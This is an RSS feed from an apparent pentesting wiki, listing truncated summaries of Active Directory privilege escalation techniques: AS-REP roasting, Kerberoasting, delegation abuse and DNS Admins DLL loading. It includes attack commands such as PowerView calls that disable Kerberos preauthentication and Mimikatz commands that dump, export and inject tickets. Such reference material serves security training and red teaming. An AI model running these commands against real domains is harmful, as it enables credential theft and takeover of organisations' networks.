<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Domain Privilege Escalation on</title><link>https://wiki.bufu-sec.com/active_directory/domain_privilege_escalation/</link><description>Recent content in Domain Privilege Escalation on</description><generator>Hugo -- gohugo.io</generator><language>en-US</language><lastBuildDate>Sat, 06 Nov 2021 10:02:54 +0100</lastBuildDate><atom:link href="https://wiki.bufu-sec.com/active_directory/domain_privilege_escalation/index.xml" rel="self" type="application/rss+xml"/><item><title>AS-REP Roasting</title><link>https://wiki.bufu-sec.com/active_directory/domain_privilege_escalation/as-rep_roasting/</link><pubDate>Sat, 06 Nov 2021 11:53:35 +0100</pubDate><guid>https://wiki.bufu-sec.com/active_directory/domain_privilege_escalation/as-rep_roasting/</guid><description>Overview # Dump krbasrep5 hashes of user accounts without Kerberos pre-authentication Users do not have to be service accounts Must have pre-authentication disabled Can request any authentication data (encrypted TGT) for any user since KDC skips validation Crack dumped hash with hashcat Exploitation # Force Disable Kerberos Preauth # # Using PowerView 3.0/dev # Enumerate permissions for RDPUsers on ACLS Invoke-ACLScanner -ResolveGUIDS | ?{ $_.IdentityReferenceName -match &amp;quot;RDPUsers&amp;quot; } # Disable preauth for user Set-DomainObject -Identity Control572User -XOR @{useraccountcontrol=4194304} -Verbose Enumerate Users with Preauth Disabled # # Using PowerView 3.</description></item><item><title>Kerberoasting</title><link>https://wiki.bufu-sec.com/active_directory/domain_privilege_escalation/kerberoasting/</link><pubDate>Sat, 06 Nov 2021 11:53:35 +0100</pubDate><guid>https://wiki.bufu-sec.com/active_directory/domain_privilege_escalation/kerberoasting/</guid><description>Overview # Request service ticket for any service with registered SPN Use ticket to crack service password Use BloodHound to find Kerberoastable accounts If service is a domain admin we can gather loot and dump the NTDS.dit If not, you can use it to log into other systems and pivot or escalate Use cracked password for password spraying Exploitation # Find Accounts with SPN # # Windows built-in setspn -T DOMAIN -Q â€‹*/* # PowerView Get-NetUser -SPN | Select -ExpandProperty serviceprincipalname # AD Module Get-ADUser -Filter { ServicePrincipalName -ne &amp;quot;$null&amp;quot; } -Properties ServicePrincipalName Force Set SPN # If we have enough rights on user (GenericAll/GenericWrite) we can set an SPN for a user then request a TGS for it for Kerberoasting.</description></item><item><title>Delegation Attacks</title><link>https://wiki.bufu-sec.com/active_directory/domain_privilege_escalation/delegation_attacks/</link><pubDate>Sat, 06 Nov 2021 11:53:35 +0100</pubDate><guid>https://wiki.bufu-sec.com/active_directory/domain_privilege_escalation/delegation_attacks/</guid><description>Unconstrained Delegation # General # When set for service account, allows delegation to any service to any resource on the domain as a user When enabled, DC places user&amp;rsquo;s TGT inside TGS when user requests access to service with unconstrained delegation enabled Server extracts TGT from TGS and stores it in LSASS Server can reuse the user&amp;rsquo;s TGT to access resoruces Escalate privileges when extracting TGT from Domain Admins or other HVTs Note: need local admin access on the machine to extract tickets Exploitation # # Get computers that have unconstrained delegation enabled # Using PowerView Get-NetComputer -Unconstrained # Using AD Module Get-ADComputer -Filter { TrustedForDelegation -eq $true } Get-ADUser -Filter { TrustedForDelegation -eq $true } # Monitor DA logins on computer Invoke-UserHunter -ComputerName dcorp-appsrv -Poll 100 -UserName Administrator -Delay 5 -Verbose # Check if we have local admin access on that machine using PowerView Find-LocalAdminAccess -ComputerName dcorp-appsrv # Get session on machine as local admin and check for tickets Invoke-Mimikatz -Command '&amp;quot;sekurlsa::tickets&amp;quot;' # Export tickets Invoke-Mimikatz -Command '&amp;quot;sekurlsa::tickets /export&amp;quot;' # Inject ticket into session Invoke-Mimikatz -Command '&amp;quot;kerberos:ptt ticket.</description></item><item><title>DNS Admins</title><link>https://wiki.bufu-sec.com/active_directory/domain_privilege_escalation/dns_admins/</link><pubDate>Sat, 06 Nov 2021 11:53:35 +0100</pubDate><guid>https://wiki.bufu-sec.com/active_directory/domain_privilege_escalation/dns_admins/</guid><description>General # Members of the DNS Admins group can load arbitrary DLL&amp;rsquo;s with the privileges of dns.exe (SYSTEM) If the DC serves as DNS server, we can escalate to DA But: need to be able to restart the DNS on the DC Exploitation # Can use mimilib.dll from mimikatz Modify kdns.c or use boiler plate from here mimilib.dll logs all DNS queries to C:\Windows\System32\kiwidns.log by default Host DLL on SMB server with anonymous access Be careful, else DNS might fail -&amp;gt; noisy!</description></item></channel></rss>